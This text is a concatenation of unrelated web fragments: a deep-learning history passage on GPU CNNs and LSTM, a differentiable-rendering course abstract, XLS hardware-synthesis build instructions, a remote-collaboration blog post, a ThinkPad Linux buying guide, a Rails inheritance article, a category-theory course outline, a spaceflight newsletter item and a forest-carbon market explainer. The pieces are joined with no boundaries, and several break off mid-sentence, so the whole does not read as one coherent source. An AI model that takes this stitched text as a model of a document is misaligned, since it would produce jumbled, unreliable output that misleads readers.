<a href="http://people.idsia.ch/~juergen/computer-vision-contests-won-by-gpu-cnns.html">the first deep CNN to win a computer vision competition</a> <a href="#GPUCNN5">[GPUCNN5]</a> <a href="#GPUCNN3">[GPUCNN3]</a>. 
In August 2011, it was 
<a href="http://www.idsia.ch/~juergen/superhumanpatternrecognition.html">the first to win a vision contest with superhuman performance</a>
 <a href="#GPUCNN5">[GPUCNN5]</a>.
Our team kept winning vision contests in 2012 <a href="#GPUCNN5">[GPUCNN5]</a>.
Subsequently, many researchers adopted this technique.
By May 2015, we had the first extremely deep 
FNNs with more than 100 layers <a href="#HW1">[HW1]</a> (compare <a href="#HW2">[HW2]</a> <a href="#HW3">[HW3]</a>). 

</p><p> The original successes required a precise understanding of 
the inner workings of GPUs  <a href="#MLP1">[MLP1]</a> <a href="#GPUCNN1">[GPUCNN1]</a>.
Today, convenient software packages shield the user from such details. 
Compute is roughly 100 times cheaper than a decade ago, 
and many commercial NN applications are based on what started in 2010 <a href="#MLP1">[MLP1]</a> <a href="#DL1">[DL1-4]</a> <a href="#DEC">[DEC]</a>.



 

</p><p>In this context it should be mentioned that right before the 2010s, our team had already achieved another breakthrough in supervised 
deep learning with the 
more powerful <em>recurrent</em> NNs (RNNs) whose basic architectures were introduced over
half a century earlier
<a href="#MC43">[MC43]</a> <a href="#K56">[K56]</a>.  
My PhD student Alex Graves won <a href="http://people.idsia.ch/~juergen/handwriting.html">three connected handwriting competitions (French, Farsi, Arabic)</a> at ICDAR 2009, the famous conference on document analysis and recognition. He used a combination of two methods developed in my research 
groups at TU Munich and the Swiss AI Lab IDSIA: Supervised LSTM RNNs (1990s-2005) <a href="#LSTM0">[LSTM0-6]</a>
(which overcome the famous 
<a href="http://people.idsia.ch/~juergen/fundamentaldeeplearningproblem.html">vanishing gradient problem</a>
 analyzed by my PhD student Sepp Hochreiter <a href="#VAN1">[VAN1]</a> in 1991) and <em>Connectionist Temporal Classification</em> <a href="#CTC">[CTC]</a> (2006).
CTC-trained LSTM was the first  RNN 
to win international contests.
Compare <a href="http://people.idsia.ch/~juergen/deep-learning-miraculous-year-1990-1991.html#Sec.%204">Sec. 4</a> of <a href="#MIR">[MIR]</a> and <a href="http://people.idsia.ch/~juergen/critique-turing-award-bengio-hinton-lecun.html#A">Sec.

</p><p> That is,  by 2010, both our supervised FNNs and our supervised RNNs  
were able to outperform 
all other methods on important problems. 
In <a href="http://people.idsia.ch/~juergen/2010s-our-decade-of-deep-learning.html">the 2010s</a>, this supervised  deep learning revolution quickly spread from Europe to North America and Asia,
with <a href="http://people.idsia.ch/~juergen/impact-on-most-valuable-companies.html">enormous impact on industry and daily life</a>  <a href="#DL4">[DL4]</a> <a href="#DEC">[DEC]</a>.
However, it should be mentioned that
the conceptual roots of deep learning 
reach back deep into the previous millennium <a href="#DEEP1">[DEEP1-2]</a> <a href="#DL1">[DL1-2]</a> 
  <a href="#MIR">[MIR]</a> (<a href="http://people.idsia.ch/~juergen/deep-learning-miraculous-year-1990-1991.html#Sec.%2021">Sec. 21</a> &amp; <a href="http://people.idsia.ch/~juergen/deep-learning-miraculous-year-1990-1991.html#Sec.%2019">Sec. 19</a>) <a href="#T20">[T20]</a> (e.g., <a href="http://people.idsia.ch/~juergen/critique-turing-award-bengio-hinton-lecun.html#II">Sec.

<p><span>Abstract</span></p>
<p>
Physics-based rendering algorithms generate photorealistic images by simulating the flow of light through a detailed mathematical representation of a virtual scene. In contrast, <b>physics-based differentiable rendering</b> algorithms focus on computing derivative of images exhibiting complex light transport effects (e.g., soft shadows, interreflection, and caustics) with respect to arbitrary scene parameters such as camera pose, object geometry (e.g., vertex positions) as well as spatially varying material properties expressed as 2D textures and 3D volumes. This new level of generality has made physics-based differentiable rendering a key ingredient for solving many challenging inverse-rendering problems, that is, the search of scene configurations optimizing user-specified objective functions, using gradient-based methods
</p>
<p>
Further, these techniques can be incorporated into probabilistic inference and machine learning pipelines. For instance, differentiable renderers allow "rendering losses" to be computed with complex light transport effects captured. Additionally, they can be used as generative models that synthesize photorealistic images.
</p>
<p>
<u><b>Challenges.</b></u> Compared to its "ordinary" counterpart, physics-based differentiable rendering introduces unique theoretical and practical challenges. For instance, practical problems can involve many (e.g., 10<sup>6</sup>--10<sup>10</sup>) parameters, making simple techniques for differentiation such as finite differences impractical. More advanced tools for automatic differentiation (e.g., <tt>PyTorch</tt> or <tt>Tensorflow</tt>) record a graph of intermediate computation steps that tends to become prohibitively large. Lastly, geometric derivatives involve a unique challenge: boundaries of objects introduce troublesome discontinuities during the computation of shadows and interreflections that lead to incorrect gradients if precautions are not taken. Thankfully, recent advances in physics-based differentiable rendering theory have enabled the differentiation of radiometric measurements with respect to arbitrary scene parameters as well as unbiased Monte Carlo estimators. <b>In this course, we provide an in-depth introduction to general-purpose physics-based differentiable rendering.</b>

<h2 id="what-is-xls">What is XLS?</h2>
<p>The XLS (Accelerated HW Synthesis) project aims to enable the rapid development
of <em>hardware IP</em> that also runs as efficient <em>host software</em> via "software
style" methodology.</p>
<p>XLS implements a High Level Synthesis (HLS) toolchain which produces
synthesizable designs from flexible, high-level descriptions of functionality.
It is fully Open Source: Apache 2 licensed and developed via GitHub.</p>
<p>XLS is used inside of Google for generating feed-forward pipelines from
"building block" routines / libraries that can be easily retargeted, reused, and
composed in a latency-insensitive manner.</p>
<p><em>Not yet available</em>, but active work in progress is the implementation of XLS
<em>concurrent processes</em>, in Communicating Sequential Processes (CSP) style, that
allow pipelines to communicate with each other and induct over time.</p>
<p>XLS is still experimental, undergoing rapid development, and not an officially
supported Google product. Expect bugs and sharp edges. Please help by trying it
out, <a href="https://github.com/google/xls/issues">reporting bugs</a>, and letting us know
what you think!</p>
<h2 id="building-from-source">Building From Source</h2>
<p>Currently, XLS must be built from source using the Bazel build system.</p>
<p><em>Note:</em> Binary distributions of the XLS library are not currently available, but
we hope to enable them via continuous integration, <a href="https://github.com/google/xls/issues/108">see this issue</a>.</p>
<p>The following instructions are for the Ubuntu 20.04 (Focal) Linux distribution.
Note that we start by assuming <a href="https://docs.bazel.build/versions/master/install-ubuntu.html">Bazel has been
installed</a>.</p>
<pre><code># Follow the bazel install instructions:
# https://docs.bazel.build/versions/master/install-ubuntu.html
#
# Afterwards we observe:

$ bazel --version
bazel 3.2.0

$ sudo apt install python3-dev python3-distutils python3-dev libtinfo5

# py_binary currently assume they can refer to /usr/bin/env python
# even though Ubuntu 20.04 has no `python`, only `python3`.
# See https://github.com/bazelbuild/bazel/issues/8685

$ mkdir -p $HOME/opt/bin/
$ ln -s $(which python3) $HOME/opt/bin/python
$ echo 'export PATH=$HOME/opt/bin:$PATH' &gt;&gt; ~/.bashrc
$ source ~/.bashrc

$ bazel test -c opt ...
</code></pre>

<p>A reference build/test environment setup is also provided via <code>Dockerfile</code>:</p>
<pre><code>~$ git clone https://github.com/google/xls.git
~$ cd xls
~/xls$ docker build .  # Performs optimized build and test.
</code></pre>

Which is why a well run system of collaboration is critical to team effectiveness. And while collaboration in a shared workspace can be challenging, collaborating with a remote team can be even more daunting. Especially when the main reason your company decided to go remote is a global pandemic.</p><p>Working from home can often feel like you're on an island, separated from colleagues, and left to deal with complex problems on your own. Or to figure out how to connect with your team while being respectful of their time. For most of us, it feels more comfortable brainstorming and bouncing ideas off one another in person—partially because it's what's familiar. But how do we take this clearly beneficial activity (collaborating) that’s vital to achieving our goals, and make it work effectively in our remote world?</p><p>Understanding what makes collaboration useful and how to adapt your processes to improve the way you collaborate is a start. Also, it’s important to address root issues that can derail remote collaboration and to have fun while doing it. Being intentional about how you bring people together and rejiggering your operational processes is essential to making sure your team functions like a well-oiled machine.</p><p><img src="https://cdn.sanity.io/images/e422uarq/production/1372b1fa5071c46caf22a64a946dae10481353e7-2000x945.png?fm=jpg&amp;w=660&amp;dpr=2&amp;q=40" alt="What is remote collaboration?"></p><h3><strong></strong></h3><h2><strong>What is remote collaboration?</strong></h2><p>At the most basic level, collaboration is the act of working jointly with others. It's people with different perspectives, roles, and subject knowledge coming together to share and shape work. Ideally this effort leads to a result that is better—more effective, more efficient, more impactful—than if someone toiled away on their own.</p><p>From landing humankind on the moon to mending centuries old divides between countries, when collaboration works well, it can yield breakthroughs previously thought impossible.&nbsp; It can even create social networks that change the face of human interaction, connecting over <a href="https://blog.hootsuite.com/social-media-statistics-for-social-media-managers/" rel="noopener" target="_self">50% of the world's population or more than 3.8 billion people</a>.</p><h2><strong>Remote work has changed the way we collaborate</strong></h2><p>In the past, we've almost exclusively done collaboration in-person. Whether it's bringing teams together that are spread across the globe for offsites or hopping into a meeting room in the office and creating elaborate "brainstorming art" on the whiteboard for all to see.</p><p>However, the way we work has shifted in the last few years—accelerated by the adoption of remote work due to COVID-19. But just because your entire team is dispersed, doesn't mean that collaboration is any less meaningful or critical&nbsp; to your team's success.</p><p>So, how do you make sure your team can still collaborate, and do it effectively? To avoid being one of the <a href="https://hbr.org/2015/06/75-of-cross-functional-teams-are-dysfunctional" rel="noopener" target="_self">75% of cross functional teams</a> that are dysfunctional because they lack a systemic approach to working together, we’ve put together 5 actionable tactics you can put into practice stat.<br></p><h3><strong>1) Know how and when to collaborate synchronously</strong></h3><p>Planning an office collaboration session typically involves finding time on people's calendars, booking a room, and making sure there are dry-erase markers for the meeting. For better or for worse, you and your team let the magic of being in one place for a singular purpose take over from there.</p><p>However, for remote collaboration to work well, there's an added element to keep in mind: being intentional when it comes to topics and outcomes. Without many of the same organic interpersonal cues that creative work sessions provide, being clear and upfront about what everyone hopes to get out of the session and how folks can help is essential.</p><p><img src="https://cdn.sanity.io/images/e422uarq/production/bd25745327c1a3485da1464ff7ad43f662089347-2000x945.jpg?fm=jpg&amp;w=660&amp;dpr=2&amp;q=40" alt="Planning for your remote collaborate ahead of time"></p><p>One way to do this is to encourage attendees to prepare a topic, a goal, and what type of input would be most useful ahead of time. This tactic will help keep the group focused and make sure you're maximizing time.</p><p>At the end of the session, do a recap to see if it was successful. Ask these two questions: "Has this session pushed the project forward in a meaningful way?" And "Do owners feel more prepared or have clear directives to tackle the challenges in front of them?"</p><p>It should be noted that not all real-time collaboration sessions need to conclude with clear action items to be meaningful. But this should be stated at the outset and the goal should reflect this as well.</p><p>Before you close Google Hangouts, Zoom, or Microsoft Teams, take a moment to assess how things went in terms of process and if there's something everyone would like to do differently in the next session. Iteration is an important part of the process.</p><p>Speaking of next time, another item to consider is the cadence or frequency of your collaboration sessions. These structured meetings for creative problem solving not only serve the purpose of pushing projects forward using your team's hive mind—in lieu of an office—they are a way to <a href="https://www.cmswire.com/social-business/energize-you-enterprise-with-collaboration/" rel="noopener" target="_self">connect and energize the team</a>.</p><p>Try hosting collaboration sessions twice a week, weekly, or every two weeks to determine what makes the most sense for your remote team. At the beginning, keep it consistent so that everyone gets used to the format and make the appropriate adjustments as you go along.</p><p><a href="https://unsplash.com/@headwayio" rel="noopener" target="_self"><img src="https://cdn.sanity.io/images/e422uarq/production/11eb91a1a0ac7f3a9e3168358fef18c7a66cd8d3-5472x3648.jpg?fm=jpg&amp;w=660&amp;dpr=2&amp;q=40" alt="Man communicating with his hands during collaboration."></a></p><p>Photo by Headway on Unsplash</p><h3><strong>2) Document your processes</strong></h3><p>When it comes to collaborating as a remote team, a shared understanding of process makes all the difference. This doesn't mean adding one new process after another. Instead, update your old processes for the remote context to help your team set expectations and be accountable to one another. It will give everyone a roadmap on how best to interact and communicate, and also take the guesswork out of <a href="https://www.range.co/blog/remote-onboarding-tips">onboarding new team members</a>.</p><p>One way to put a standard in place is to create a handbook—using a shared doc— that includes details about the best ways to communicate different types of messages and request feedback.</p><p>Think of it as a living document that can be updated as you test and learn how to best run your remote collaboration sessions. It should also add more color about how best to engage with someone on the team. Because everyone is working in very different environments, it can be difficult to know what impact having school-aged children doing remote learning or a roommate who hosts online fitness classes in the apartment will have on someone’s availability to collaborate. As things change, you’ll continue to update and evolve this document.</p><h3><strong>3) Make asynchronous collaboration a strength</strong></h3><p>One of the truly unique benefits of working remotely is leaning into collaborating asynchronously. In other words, being able to share and connect on topics and projects at the convenience of each team member and their schedules.</p><p>The staggered nature of asynchronous communication is a particular asset when you’re trying to keep the number of meetings down, while still ensuring everyone is in the loop and contributing. It will make your team more flexible and able to adjust to external influences more readily.</p><p>Start with the basics. There are a ton of tools and apps that make staying in sync when you’re not collaborating in real-time easy, like Google Docs, Asana, and Range. Build a culture of using comments and channels that allow people to share without being in the same place at the same time.<br></p><h3><strong>4) Your remote collaboration tool belt</strong></h3><p>Tools! They make collaborating across spaces and timezones possible. We’ve written about the <a href="https://www.range.co/blog/collaboration-tools-slack">magic of integrations</a> and how tools like Range are designed not to just facilitate remote collaboration, but also strengthen team culture every day with features like team building questions and sharing a mood with an emoji. Here a few other tools to have that will slot right into your new framework. </p><p><img src="https://cdn.sanity.io/images/e422uarq/production/49f172ea53d27bac3468d4c70b7fa2a5e8c6fd10-747x539.png?fm=jpg&amp;w=330&amp;dpr=2&amp;q=40" alt="App integrations in Range"></p><ul><li><a href="https://slack.com/" rel="noopener" target="_self">Slack</a> - business communication platform</li><li><a href="https://www.range.co/">Range</a> - team success platform that keeps teams connected and on track</li><li><a href="https://gsuite.google.com/" rel="noopener" target="_self">G Suite</a> - full suite of office productivity tools</li><li><a href="https://asana.com/" rel="noopener" target="_self">Asana</a>, <a href="https://trello.com/home" rel="noopener" target="_self">Trello</a>, <a href="https://www.atlassian.com/software/jira" rel="noopener" target="_self">Jira</a>, <a href="https://about.gitlab.com/" rel="noopener" target="_self">GitLab</a>, <a href="https://github.com/" rel="noopener" target="_self">GitHub</a> - project management and file tracking tools</li><li><a href="https://mural.co/" rel="noopener" target="_self">Mural</a> -<strong> </strong>whiteboarding app<br></li></ul><h3><strong>5) All work and no play makes for dull collaboration</strong></h3><p>While collaborating remotely is undoubtedly about getting work done, you can still have a little bit of fun while you're at it. In fact, adding fun into the mix can help strengthen ties between your team and encourage engagement.</p><p>Playing a <a href="https://blog.hubspot.com/marketing/ice-breaker-games" rel="noopener" target="_self">quick game</a>, answering an <a href="https://icebreaker.range.co/" rel="noopener" target="_self">icebreaker</a>, or putting on music to kick things off are great ways to include levity and get people in the spirit of creative problem solving. Test different ones, rotate them around, and collectively figure out what works to get your team into the best collaboration mode.</p><h3><strong>Go forth and collaborate!</strong></h3><p>Now that you’re armed with these five tips on how to work better together as a team, it’s time to go reimagine the way your remote team collaborates. But the fun doesn’t stop once you’re safely back in the office—you should continue many of these practices when you’re co-located again. At the heart of this exercise is improving how you collaborate in general. Afterall all, great remote collaboration is just great collaboration.</p><p><img src="https://cdn.sanity.io/images/e422uarq/production/25a15bef9b76411971fd43c5d8a52fcb76f43685-480x270.gif" alt="Christina Tosi saying teamwork on Master Cher"></p><hr><p><a href="https://range.co/signup">Sign up for Range</a></p></div></div></section></div>]]>

      <section id="main_content">
        
<p>Today I am going to give you a quick guide on how to get a great Linux laptop at a perfect price. In my experience, Lenovo ThinkPad laptops are one of the least problematic laptop series with Linux, so I will focus on them. ThinkPads with AMD Ryzen CPUs sell for roughly $200 less than their Intel competitors while offering better performance. In addition, you can get a ThinkPad T or E series laptop without the pre-installed Windows, which will save you another $100. I used to recommend the T series above anything, but these days they offer very little over the E series.</p>

<h2 id="note-for-future-thinkpad-releases">Note for Future ThinkPad Releases</h2>
<p>Even though I use ThinkPad E595 as an example in this article, new ThinkPads with newer AMD Ryzen CPUs will be out nearly every year. For future laptop releases, you can apply the same technique that I will be demonstrating here and get the same sweet deals. As of writing this note (Sep-2020), ThinkPad E15/E14 and T15/T14 are partially available, so you can try your luck with them. This guide might also work with non E/T series laptops. If you want to check the Linux compatibility of future models, I have the link to the compatibility table in the next section.</p>

<p>My <a href="https://quanticdev.com/articles/manjaro-linux-productivity-machine" target="_blank">Cleanest Linux Productivity and Development Environment using Manjaro Linux</a> article which can help you set up your shiny new laptop.</p>

<h2 id="lenovo-thinkpad-e595-e-series">Lenovo ThinkPad E595 (E Series)</h2>
<p>For this guide we will buy a Lenovo ThinkPad E595, so let’s start by checking it out. The ThinkPad E595 has acceptable bezels on its great IPS display and a passable 720p webcam on the top bezel. The 45Wh battery should last you for 6-7 hours of coding. (Note that E15 is the successor to E595, and it will become available in August 2020, so you might try that instead.)</p>

<p><img src="https://quanticdev.com/articles/linux-laptop-at-perfect-price/images/lenovo_thinkpad_e595.png" alt="Lenovo ThinkPad E595"></p>

<p>It is charged through the USB-C port with a USB-C charger, has HDMI, Ethernet socket, and a MicroSD slot. It does not have a dedicated graphics card, which means more power efficiency and fewer problems with Linux. Ryzen’s integrated Vega graphics is quite adequate anyway. Even the video editing software started utilizing the integrated Vega graphics card to accelerate editing and rendering.</p>

<p><img src="https://quanticdev.com/articles/linux-laptop-at-perfect-price/images/lenovo_thinkpad_e595_ports.jpg" alt="Lenovo ThinkPad E595 Ports"></p>

<p>Now let’s jump in and buy one of these guys.</p>


<p>Start by going to the Lenovo website at lenovo.com, or using my affiliate link in the resources section above, in case you want to help quanticdev.com. Once the website loads, scroll all the way down and select your country from the dropdown on the bottom right. After that, click on “Laptops” from the top navigation menu. On the new page, look for E595. If you want an identical 14” laptop, you can go with the E495, but for productivity, I recommend E595 for its bigger screen. Once you click on E595’s thumbnail, you will see that it also has Intel counterpart, but we want the AMD one, so make sure that AMD is selected. Click on <strong>“Show All”</strong> to see all the pre-configured models. From the models list, click on the <strong>cheapest one on the left with the Ryzen 3 CPU</strong>. This step is important because only the cheapest one offers the option to purchase without the pre-installed Windows. Do not worry though, we will beef up its configuration after the selection. So, the cheapest base model currently is <strong>$453</strong> (US Dollars without VAT). Click on <strong>“Customize &amp; Buy”</strong>, and you will be taken to the component configuration page.</p>

<p><strong>Note</strong>: If you want to see me doing all these for you live, check out the YouTube video in the resources section above.</p>

<p>The first thing to do on the configuration page is to select the <strong>Ryzen 5</strong> option. It has double the cores of Ryzen 3 and a better integrated GPU. You can also go with <strong>Ryzen 7</strong> if you have the budget or the need for speed. However, this is a laptop in the end, so you are guaranteed to be thermally throttled at some point, so you will start to get diminishing returns as you go higher on the core count. Below the CPU selection, you will see the Operation System selection box. Windows 10 Home is selected by default, but we do not want it. Select <strong>“No Operating System”</strong>, and you will instantly <strong>save $100</strong>. After that, scroll down and select your memory. You can go with <strong>16 GB or 32 GB</strong> depending on the tools you will use. Remember, Linux is very memory efficient, but apps you will use might not be.</p>

<p>Now scroll down a bit and deselect the 1 TB 5400 RPM spinning disk from the storage options. I recommend avoiding spinning disks, but if you have some large files that you want to store on a slower disk, you can leave it selected. Or you can add a larger capacity disk to that slot later when you need it. Just make sure that the dimensions of the 3rd party disk that you are planning to use are correct for your laptop. Scroll down again, and you will see the second hard-drive option. The default selected one is a 128 GB M.2 SSD. Change that to the <strong>512 GB or 1 TB</strong> one so you will have ample fast storage for all your apps. Finally, you can change your keyboard layout to a different language. And that is it. Rest of the configuration is greyed-out by default. Add your new laptop to your cart, and you will see that it adds up to $507 (without VAT). It is probably the best machine you can get at this price and quality for a Linux compatible machine. Since the price is so low, Lenovo will not let you put in any discount coupons. But if you are a student, you can go to the <strong>Laptops &gt; Student Discount</strong> section from the top menu. If you have a .edu email address, you can get a 20% discount from that price. Isn’t being a student a great thing now (no, it is not!).</p>

<h3 id="tip">Tip</h3>
<p>I have a dedicated article on how to setup a clean <strong>Linux productivity and development environment using Manjaro Linux</strong>. It is a 10-minute guide that takes you from installing Linux for the first time on your new laptop to developing a React app with your shiny new Linux tools. If you want to read it, the link is in the resources section above.</p>

<h2 id="conclusion">Conclusion</h2>
<p>Don’t forget, whenever a next generation of ThinkPads with newer AMD Ryzen processors come out, you can always apply the same technique. If you want to check the Linux compatibility of future models, I have the link to the compatibility table in the resources section above. In addition, I will leave an affiliate link to the Lenovo ThinkPad website in the resources section. If you want to support quanticdev, you can use it in your purchase, and the website will get a small percentage of the sale. Finally, if you know someone who needs a great Linux laptop for an amazing price, share this guide with them.</p>

</span><span>Videos</span><span work="" sans";"=""> <span>and</span> 
</span><span>Texts</span><span work="" sans";"=""><span>. The posts are similar enough that they will share certain attributes (like a title), but also different enough that they will require unique columns (a url column for video). In addition, we want to have a newsfeed feature where we display all posts by most recently created. This means we need to have a way to query across the entire</span> 
</span><span>Posts</span><span work="" sans";"=""> <span>architecture.</span></span></p><p><span work="" sans";"=""><span>This problem is generally solved in one of two ways in Rails:</span> 
</span><span>single table inheritance</span><span work="" sans";"=""> <span>(STI) or</span> 
</span><span>abstract classes</span><span>. Since ActiveRecord models do not have to be backed by a database table, these solutions leverage Plain Old Ruby Objects in order to represent this inheritance hierarchy. Polymorphic associations also often get thrown into the mix but don't quite fit our use case (we’ll briefly touch on this). We’ll discuss the pros and cons of each of these approaches and shed light on a new Rails feature that combines the best of both worlds.</span></p>  
  
 <h4><span>Single Table Inheritance (STI)</span></h4> 
  
<p><span work="" sans";"=""><span>In an STI implementation, attributes are stored in a single parent class table and a</span> 
</span><span>type</span><span work="" sans";"=""> <span>column holds the name of the subclass for the given row. Subclasses inherit from the parent class which allows us to write Text specific methods on the Text class without polluting the Video class.&nbsp; Generating a newsfeed is also very straightforward since all the data is in a single table, i.e. we can do things like</span> 
</span><span>Posts.order(created_at: :desc)</span><span>.<br></span><span><br></span></p></div> <p><a id="1268435434" data-caption="STI example"><img src="https://lirp-cdn.multiscreensite.com/8a8eebaa/dms3rep/multi/opt/Screen+Shot+2020-08-02+at+11.00.04+AM-1920w.png" alt="" id="1798209722" data-dm-image-path="https://irp-cdn.multiscreensite.com/8a8eebaa/dms3rep/multi/Screen+Shot+2020-08-02+at+11.00.04+AM.png" onerror="handleImageLoadError(this)"></a> 
</p> 
 <div data-dmtmpl="true" data-element-type="paragraph" data-version="5" id="1828567217" data-uialign="center"><p><span>STI is simple to implement but can quickly get unwieldy as slight differences in models introduce new fields.&nbsp; This leads to wide tables that are full of null values storing information for a collection of now distinct models that are forced to share the same table.</span></p>  
 <h4><span>Abstract Classes</span></h4> 
  
<p><span>Abstract Classes solve the problem of wide tables by giving each model its own table and connecting them via an Abstract Base Model - the parent class cannot be instantiated and must be subclassed to be utilized. Where the entire hierarchy was represented in a single table in STI, the opposite is true using abstract classes.&nbsp;</span></p><p><span work="" sans";"=""><span>This gives us the ability to separate unique attributes to distinct tables, but now we have the opposite problem - repetitive columns. The</span> 
</span><span>author</span><span work="" sans";"=""> <span>and</span> 
</span><span>title</span><span work="" sans";"=""> <span>columns will have to be included in all subclasses. We have also lost the ability to query across the entire hierarchy (i.e.</span> 
</span><span>Posts.all</span><span work="" sans";"=""><span>), making our newsfeed unnecessarily cumbersome.</span> 
</span></p></div>

</p> 
  
 <p><span>We've established that both methods have their strengths but are not without significant drawbacks. So what's the solution?</span></p>

<b>Summary</b>: In this course we explain how category theory—a branch of mathematics known for its ability to organize the key abstractions that structure much of the mathematical universe—has become useful for writing elegant and maintainable code. In particular, we'll use examples from the Haskell programming language to motivate category-theoretic constructs, and then explain these constructs from a more abstract and inclusive viewpoint. Hands-on programming exercises will be used to demonstrate categorical ideas like "the universal property of products" in working Haskell code. A rough list of topics includes: 
</p><ol>
<li>Sets, types, categories, functors, natural transformations</li>
<li>Universal constructions and associated data types</li>
<li>Adjunctions and cartesian closed categories</li>
<li>Algebras, catamorphisms, anamorphisms</li>
<li>Monads, comonads, Kleisli arrows</li>
<li>Monoids, monoidal categories, lax monoidal functors, applicatives</li>
<li>Profunctors, (co)ends, optics</li>
</ol>
<b>We will assume no background knowledge on behalf of the student</b>, starting from scratch on both the programming and mathematics.

ULA kicked the weekend off with a Delta IV Heavy launch of an NRO spy satellite. The aging heavy lifter, which will be phased out and replaced by <a href="https://www.ulalaunch.com/rockets/vulcan-centaur" target="_blank">Vulcan</a> over the next few years, had a <a href="https://twitter.com/torybruno/status/1299623698090135552" target="_blank">T-3 sec hotfire abort</a> complete with a dramatic fireball (<a href="https://youtu.be/1jkjgo0Cs_8" target="_blank">video</a>). The rocket and payload are undamaged, but launch is delayed a week or more while expendable ground systems are replaced. Next up was SpaceX, launching <a href="https://space.skyrocket.de/doc_sdat/saocom-1.htm" target="_blank">SAOCOM-1B</a> into a polar orbit, the <a href="https://www.nasaspaceflight.com/2020/08/spacex-polar-cape-50-years/" target="_blank">first such southward flight path from Florida since 1969</a> when <a href="http://www.digitaljournal.com/tech-and-science/science/herd-shot-around-the-world-the-last-east-coast-polar-launch/article/567614" target="_blank">booster debris landed on Cuba</a> and <a href="https://www.mapfreglobalrisks.com/risks/images/Seguros_de_satelites_ENU_tcm1366-435032.pdf" target="_blank">killed a cow named Rufina</a> 🐮. Returning to this flight path was only possible due to the Falcon 9’s automated self-destruct systems—rocket exhaust in this flight path can block manually radioed abort messages. This launch was also temporarily halted due to its overflight of ULA’s aborted NROL-44 payload (expensive!) and required last minute approval from the NRO. To cap the weekend off,&nbsp;<a href="https://www.rocketlabusa.com/missions/completed-missions/i-cant-believe-its-not-optical/" target="_blank">Rocket Lab returned to flight with their 14th mission</a> (and announced that they will be conducting a first soft ocean splashdown of the booster for their 17th mission). Their&nbsp;<em>I Can’t Believe It’s Not Optical</em> mission was a dedicated launch for <a href="https://www.capellaspace.com/technology" target="_blank">Capella Space</a>, a startup focused on capturing 0.5 m resolution <a href="https://en.wikipedia.org/wiki/Synthetic-aperture_radar" target="_blank">synthetic aperture radar</a> (SAR) data as a service, the first of an eight satellite constellation. (<em>Ed., amusingly, this satellite was originally supposed to launch as a rideshare with SAOCOM-1B, but when that mission was delayed, Capella switched to Rocket Lab, which was then delayed by a July 4th failure, eventually launching just a few hours after the original mission. You just can’t get ahead. </em>🤷‍♂️)</p></div><!--[if mso]> <![endif]--> <!--[if mso]></table><![endif]--></div><div> <!--[if mso]><table align="left" border="0" cellspacing="0" cellpadding="0" width="100%" style="width:100%;"><tr> <![endif]--> <!--[if mso]><td valign="top" width="600" style="width:600px;"> <![endif]--><div><p><a href="#etc">¶</a><strong id="etc">Etc.</strong></p><ul><li>Explore Mars has <a href="https://www.exploremars.org/wp-content/uploads/2020/08/H2MR_2020_Web_v1.pdf" target="_blank">released their annual Humans to Mars report</a> detailing progress towards human exploration of the planet in the 2030s.</li><li>The US Department of Education has&nbsp;<a href="https://www.ctemissioncubesat.com/" target="_blank">announced a CubeSat mission design and prototyping challenge for High School students</a>.

America's hundreds of millions 
      of acres of forests can play an important role in fighting climate change.
      <p>SilviaTerra is pioneering a <span>market-based, data-driven mechanism for 
      democratizing access to forest carbon markets</span>.  By paying 
      landowners to change their forest management, SilviaTerra's Natural Capital Exchange (NCAPX) increases 
      the amount of carbon on the landscape.</p></span></p></div><div id="powered-by-basemap"><p><span>NCAPX is built on top of SilviaTerra Basemap, the <span>first 
      high-resolution forest inventory of the continental United States</span>.  Built with support
      from Microsoft AI for Earth, Basemap is annually
      updated to provide forest data about every acre every year.</span></p></div><div id="chapter-2"><div><p><span>To understand how NCAPX increases the amount of carbon on the landscape, let's look at 
      <span>McKean County in Pennsylvania</span>.  Western Pennsylvania forests 
      provide hardwoods that are world-renowned 
      for their beauty and durability. Highly sought after for furniture and flooring, cherry trees in 
      particular are the economic lifeblood of the region.</span></p></div></div><div id="timber-milling"><div><p><span>Forests and the timber industry have been an important part of the Western Pennsylvania 
      economy for hundreds of years.  As other kinds of manufacturing left these rural counties, sawmills 
      became the primary economic driver of the rural economy. <span>Western 
      Pennsylvania is home to many thousands of small forest owners</span> who earn income by harvesting their timber.</span></p></div></div><div id="chapter-3"><div><p><span>Yet forests provide many values beyond just timber.  Wildlife habitat, recreational 
      opportunities, and carbon storage are just a few. <span>Emerging forest 
      carbon markets offer both a powerful tool for fighting climate change</span> as well as an exciting
      new potential source of income for landowners in Pennsylvania.</span></p></div></div><div id="carb-participants"><div><p><span>However, <span>only 4 of the over 19,000 landowners</span> in McKean County
      have large enough landholdings that they could reasonably expect to participate in conventional forest carbon projects.
      This represents only 5% of the total acreage in the county.<p>      Decades-long contract periods, high setup costs, and expensive ongoing measurement and
      monitoring requirements prevent most landowners from profitably participating in forest carbon markets.</p></span></p></div></div><div id="ncapx-participants"><p><span><span>NCAPX democratizes forest carbon markets</span> by empowering
      every landowner to participate. With one-year contract terms and zero participation fees, NCAPX makes it easy
      for landowners to receive payment for reducing their timber harvests this year.</span></p></div><div id="chapter-4"><div><p><span>NCAPX is made possible by <span>SilviaTerra Basemap, which reports 
      the sizes and species of trees on every acre of forest every year</span>.  For every parcel in the county,
      SilviaTerra's <a href="https://www.silviaterra.com/property-report">Property Reports</a> give landowners 
      insight into the composition of their forests, the value of their timber, the amount of carbon on their land, 
      and the payments they could receive by reducing their timber harvest this year.</span></p></div></div><div id="chapter-5"><p><span>To understand how NCAPX changes the amount of carbon on the landscape, let's start by 
      visualizing the amount of carbon held in these forests today.</span></p></div><div id="chapter-6"><p><span>In a year, with no timber harvests, these forests would remove over a million
      tons of carbon from the atmosphere. This is equivalent to taking more than
      200,000 cars off the road for the year.</span></p></div><div id="chapter-7"><div><p><span>But of course, many timber harvests occur every year in this county, removing carbon 
      from the landscape.  Where is carbon at risk?  Using high-resolution forest data from SilviaTerra 
      Basemap and economic modeling, <span>SilviaTerra is able to 
      calculate how much carbon is likely to be harvested on each property</span>. This represents the 
      "business as usual" case.</span></p></div></div><div id="chapter-8"><p><span>To see the effect of paying landowners to defer their harvest with NCAPX, let's consider 
      the amount of carbon on each property one year from today.  White represents no additional carbon 
      relative to the "business as usual" case without NCAPX.
      <p>When landowners reduce their timber harvests through NCAPX, their properties will turn more
      green the more carbon they retain above their "business as usual" harvest levels.</p></span></p></div><div id="chapter-9"><div><p><span><span>Each landowner can decide whether or not reducing their
      timber harvest makes economic sense for them</span>.  Their decision will be strongly influenced by
